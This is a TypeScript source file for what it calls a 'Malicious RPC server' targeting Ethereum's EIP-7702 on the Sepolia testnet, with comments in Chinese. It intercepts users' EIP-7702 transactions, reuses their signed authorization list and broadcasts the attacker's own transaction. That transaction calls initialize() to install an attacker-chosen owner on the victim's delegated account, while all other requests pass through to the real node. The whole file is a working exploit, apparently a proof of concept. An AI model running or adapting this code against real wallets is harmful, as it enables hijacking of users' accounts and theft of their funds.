import express from 'express'
import bodyParser from 'body-parser'
import {ethers, hashAuthorization, JsonRpcProvider, toBigInt, TransactionRequest, Wallet} from 'ethers'

import * as dotenv from "dotenv";
import axios from "axios";
dotenv.config();

const app = express()
app.use(bodyParser.json())

const chainId = 11155111;

const provider = new JsonRpcProvider(process.env.FORWARD_TO_RPC!, {
    name: "sepolia",
    chainId: chainId,
});

const wallet = new Wallet(process.env.ATTACKER_PRIVATE_KEY!).connect(provider);


const calcMaliciousInitializeCallData = async () => {
    const abi = [
        "function owner()",
        "function getName()",
        "function directlyRevert()",
        "function initialize(address newOwner)",
    ];

    // 创建接口
    const iface = new ethers.Interface(abi);

    // 定义参数
    const owner = process.env.MALICOUS_OWNER_REPLACED!;

    // 编码 calldata
    const calldata = iface.encodeFunctionData("initialize", [owner]);

    console.log("Calldata:", calldata);
    return calldata;
}

// 判断是否为 eip-7702 类型（即交易 type === 0x04）
function isEIP7702RawTx(rawTx: string): boolean {
    return rawTx.slice(0, 4) === '0x04' // type prefix
}

app.post('/', async (req, res) => {
    const { method, params } = req.body

    // 我们只拦截 rawTx 类型的交易
    if (method === 'eth_sendRawTransaction' && params.length > 0) {
        const rawTx = params[0]

        if (isEIP7702RawTx(rawTx)) {
            console.log('[*] Captured EIP-7702 raw tx')

            try {
                // 解码原始交易
                const tx = ethers.Transaction.from(rawTx)

                const authSigner = ethers.recoverAddress(hashAuthorization(tx.authorizationList![0]), tx.authorizationList![0].signature);
                console.log('[+] InitCode length:', tx.authorizationList?.length, tx.authorizationList)
                console.log('[+] Signer:', authSigner)

                const feeData = await provider.getFeeData();

                // 构造恶意交易（伪造同样结构）
                const maliciousTx = {
                    type: 0x04,
                    authorizationList: tx.authorizationList,
                    nonce: await wallet.getNonce(),
                    gasLimit: toBigInt(100000),
                    maxFeePerGas: feeData.maxFeePerGas || 42,
                    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || 2,
                    to: authSigner,
                    value: toBigInt(0),
                    chainId: tx.chainId,
                    data: await calcMaliciousInitializeCallData(),
                }

                // 使用攻击者的钱包进行签名
                const signedTx = await wallet.signTransaction(maliciousTx);
                const txHash = await provider.send('eth_sendRawTransaction', [signedTx]);

                console.log('[!] Sending malicious tx from address:', txHash, await wallet.getAddress());

                // 将恶意交易广播到真实链上 —— 暂时不做
                return res.json({
                    method: req.method,
                    params: req.params,
                    id: 9,
                    jsonrpc: '2.0',
                    result: txHash
                });
            } catch (err) {
                console.error('[x] Error parsing or modifying transaction:', err)
                return res.status(500).json({ error: 'Invalid transaction or manipulation failed' })
            }
        }
    }
    // 原样转发请求
    try {
        const response = await axios.post(process.env.FORWARD_TO_RPC!, req.body)
        res.json(response.data)
    } catch (err) {
        res.status(502).json({ error: 'Failed to forward request' })
    }
})

app.listen(8547, () => {
    console.log('Malicious RPC server listening on http://localhost:8547')
})
